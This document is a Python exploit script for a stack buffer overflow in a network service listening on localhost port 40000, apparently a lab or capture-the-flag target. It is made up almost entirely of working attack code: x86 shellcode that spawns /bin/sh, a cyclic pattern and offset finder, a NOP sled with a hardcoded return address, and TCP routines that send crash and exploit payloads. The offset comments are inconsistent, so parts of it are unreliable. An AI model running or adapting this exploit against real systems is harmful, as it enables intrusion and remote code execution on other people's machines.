#!/usr/bin/env python3

import socket
import struct
import sys

# Default target information
TARGET_HOST = '127.0.0.1'
TARGET_PORT = 40000  # The port used in the example

# Buffer size in the vulnerable program
BUFFER_SIZE = 128

# Linux/x86 shellcode that executes /bin/sh
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

def pattern_create(length):
    """Create a pattern of a given length"""
    pattern = b""
    parts = []
    for upper in range(65, 91):  # uppercase 'A'-'Z'
        for lower in range(97, 123):  # lowercase 'a'-'z'
            for digit in range(48, 58):  # digits '0'-'9'
                parts.append(bytes([upper, lower, digit]))
                if len(pattern) + 3 <= length:
                    pattern += bytes([upper, lower, digit])
                    if len(pattern) == length:
                        return pattern
    # If we need more pattern than the standard one, cycle through again
    while len(pattern) < length:
        pattern += parts[len(pattern) % len(parts)]
        if len(pattern) == length:
            return pattern
    return pattern

def pattern_offset(value, pattern_length=1024):
    """Find the offset of a value in the pattern"""
    pattern = pattern_create(pattern_length)
    if isinstance(value, int):
        # Convert the value to little-endian bytes
        value_bytes = struct.pack("<I", value)
    else:
        value_bytes = value.encode()
    
    try:
        offset = pattern.index(value_bytes)
        return offset
    except ValueError:
        return -1

def create_payload(offset_to_eip):
    # Padding to reach the return address
    padding = b"A" * offset_to_eip
    
    # NOP sled to increase chances of hitting our shellcode
    nop_sled = b"\x90" * 32
    
    # Return address - we'll overwrite EIP with this address
    # This is a placeholder - you need to replace it with the actual address
    # where your shellcode will be located in memory
    # For demonstration, we'll use a fake address
    return_addr = struct.pack("<I", 0xbffff5c0)  # Example address, needs to be adjusted
    
    # Construct the final payload
    payload = padding + return_addr + nop_sled + shellcode
    
    return payload

def exploit(host, port, payload):
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the target
        print(f"[*] Connecting to {host}:{port}")
        s.connect((host, port))
        
        # Send the payload
        print(f"[*] Sending payload ({len(payload)} bytes)")
        s.send(payload)
        
        # Try to receive data (may not happen if exploit works)
        try:
            response = s.recv(1024)
            print(f"[*] Received: {response}")
        except:
            pass
        
        # If exploit is successful, we should get a shell
        # For a real exploit, you would add code here to interact with the shell
        print("[*] If the exploit was successful, the server should have crashed or a shell should be available")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Close the socket
        s.close()

def find_offset():
    # Create a pattern to find the exact offset
    pattern_size = 600  # Larger than the 516 bytes that caused the crash
    pattern = pattern_create(pattern_size)
    
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the target
        print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}")
        s.connect((TARGET_HOST, TARGET_PORT))
        
        # Send the pattern
        print(f"[*] Sending pattern ({len(pattern)} bytes)")
        s.send(pattern)
        
        print("[*] Pattern sent. Check the value of EIP in the crash to determine the offset.")
        print("[*] Run: dmesg | tail   or check core dump to find the EIP value")
        print("[*] Then use: python3 exploit-buffer-overflow.py offset <EIP_VALUE>")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Close the socket
        s.close()

def send_specific_size(size):
    # Send a payload of specific size to test
    payload = b"A" * size
    
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the target
        print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}")
        s.connect((TARGET_HOST, TARGET_PORT))
        
        # Send the payload
        print(f"[*] Sending {size} bytes")
        s.send(payload)
        
        print(f"[*] Sent {size} bytes. Check if server crashed.")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Close the socket
        s.close()

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <mode> [args...]")
        print("Modes:")
        print("  pattern - Send a pattern to find the offset")
        print("  offset <value> - Find the offset of a value in the pattern")
        print("  size <bytes> - Send a specific number of bytes")
        print("  exploit - Send the exploit payload")
        return
    
    mode = sys.argv[1]
    
    if mode == "pattern":
        find_offset()
    elif mode == "offset" and len(sys.argv) > 2:
        try:
            # Try to interpret as hex
            value = int(sys.argv[2], 16)
            offset = pattern_offset(value)
            if offset != -1:
                print(f"[*] Offset found at: {offset}")
            else:
                print(f"[!] Value not found in pattern")
        except ValueError:
            print(f"[!] Invalid value: {sys.argv[2]}")
    elif mode == "size" and len(sys.argv) > 2:
        try:
            size = int(sys.argv[2])
            send_specific_size(size)
        except ValueError:
            print(f"[!] Invalid size: {sys.argv[2]}")
    elif mode == "exploit":
        # Based on the segmentation fault at 516 bytes, we estimate the offset
        # This is an estimate and should be verified with pattern analysis
        offset_to_eip = 140  # BUFFER_SIZE + some bytes for stack frame
        
        payload = create_payload(offset_to_eip)
        exploit(TARGET_HOST, TARGET_PORT, payload)
    else:
        print(f"Unknown mode: {mode}")

if __name__ == "__main__":
    main()